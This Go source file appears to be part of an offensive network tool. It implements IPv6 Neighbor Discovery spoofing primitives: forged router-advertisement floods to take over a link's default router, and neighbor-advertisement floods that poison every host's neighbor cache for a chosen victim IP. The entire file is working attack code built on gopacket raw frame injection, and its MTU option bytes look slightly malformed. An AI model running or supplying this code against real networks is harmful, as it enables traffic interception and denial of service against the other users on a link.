// Package ndp implements IPv6 Neighbor Discovery spoofing primitives: router
// advertisement floods (default-router takeover) and neighbor advertisement
// flooding (IP-to-MAC claiming). Frames are crafted with gopacket and sent on
// a promiscuous raw socket.
package ndp

import (
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// allNodes is the IPv6 all-nodes link-local multicast group.
var allNodes = net.ParseIP("ff02::1")

// Sender crafts and transmits NDP frames on an interface.
type Sender struct {
	iface string
	h     *pcap.Handle
	Sent  int
}

// NewSender opens a promiscuous handle for frame injection.
func NewSender(iface string) (*Sender, error) {
	h, err := pcap.OpenLive(iface, 65535, true, 100*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("ndp: open %s: %w", iface, err)
	}
	return &Sender{iface: iface, h: h}, nil
}

// Close releases the socket.
func (s *Sender) Close() {
	if s.h != nil {
		s.h.Close()
		s.h = nil
	}
}

// RouterAdvertisement floods a forged RA announcing srcMAC as the default
// router for the link (prefix derived from the interface's IPv6 address). It
// returns the number of frames sent and any error.
func (s *Sender) RouterAdvertisement(srcIP net.IP, srcMAC net.HardwareAddr, count int) (int, error) {
	prefix := prefixFrom(srcIP)
	opts := layers.ICMPv6Options{
		{Type: layers.ICMPv6OptSourceAddress, Data: srcMAC},                     // 8 bytes
		{Type: layers.ICMPv6OptPrefixInfo, Data: prefixInfoData(64, prefix)},    // 32 bytes
		{Type: layers.ICMPv6OptMTU, Data: []byte{0, 0, 0, 0, 0x00, 0x05, 0xdc}}, // 8 bytes, MTU 1500
	}
	ra := &layers.ICMPv6RouterAdvertisement{
		HopLimit:       255,
		RouterLifetime: 1800, // 30 min
		Options:        opts,
	}
	sent, err := s.flood(srcIP, srcMAC, allNodes, layers.ICMPv6TypeRouterAdvertisement, ra, count)
	if err != nil {
		return 0, err
	}
	return sent, nil
}

// NeighborAdvertisement floods NAs claiming that victimIP maps to srcMAC so
// every host on the link learns a poisoned neighbor-cache entry (IPv6
// equivalent of ARP poisoning).
func (s *Sender) NeighborAdvertisement(srcIP net.IP, srcMAC net.HardwareAddr, victimIP net.IP, count int) (int, error) {
	na := &layers.ICMPv6NeighborAdvertisement{
		Flags:         0x20, // override existing cache entry
		TargetAddress: victimIP,
		Options: layers.ICMPv6Options{
			{Type: layers.ICMPv6OptTargetAddress, Data: srcMAC},
		},
	}
	return s.flood(srcIP, srcMAC, allNodes, layers.ICMPv6TypeNeighborAdvertisement, na, count)
}

// flood serializes an ICMPv6 message with the given type and sends `count`
// copies to the destination multicast address.
func (s *Sender) flood(srcIP net.IP, srcMAC net.HardwareAddr, dstIP net.IP, typ uint8, msg gopacket.SerializableLayer, count int) (int, error) {
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(typ, 0),
	}
	ipv6 := &layers.IPv6{
		Version:      6,
		HopLimit:     255,
		NextHeader:   layers.IPProtocolICMPv6,
		TrafficClass: 0x00,
		FlowLabel:    0,
		SrcIP:        srcIP,
		DstIP:        dstIP,
	}
	eth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0x33, 0x33, 0x00, 0x00, 0x00, 0x01},
		EthernetType: layers.EthernetTypeIPv6,
	}
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, opts, eth, ipv6, icmp, msg); err != nil {
		return 0, fmt.Errorf("ndp: serialize: %w", err)
	}
	raw := buf.Bytes()
	for i := 0; i < count; i++ {
		if err := s.h.WritePacketData(raw); err != nil {
			return s.Sent, fmt.Errorf("ndp: write: %w", err)
		}
		s.Sent++
	}
	return count, nil
}

// prefixFrom returns the 64-bit /64 prefix of an IPv6 address.
func prefixFrom(ip net.IP) net.IP {
	v6 := ip.To16()
	out := make(net.IP, 16)
	copy(out, v6[:8])
	return out
}

// prefixInfoData builds the 30-byte payload of an ICMPv6 prefix-information
// option: prefix length, flags, valid/preferred lifetimes, reserved, prefix.
func prefixInfoData(length byte, prefix net.IP) []byte {
	d := make([]byte, 30)
	d[0] = length
	d[1] = 0xc0                                     // L (on-link) + A (autonomous) flags
	d[2], d[3], d[4], d[5] = 0x00, 0x01, 0x51, 0x80 // valid 86400s
	d[6], d[7], d[8], d[9] = 0x00, 0x00, 0x03, 0x84 // preferred 900s
	copy(d[14:], prefix.To16())
	return d
}
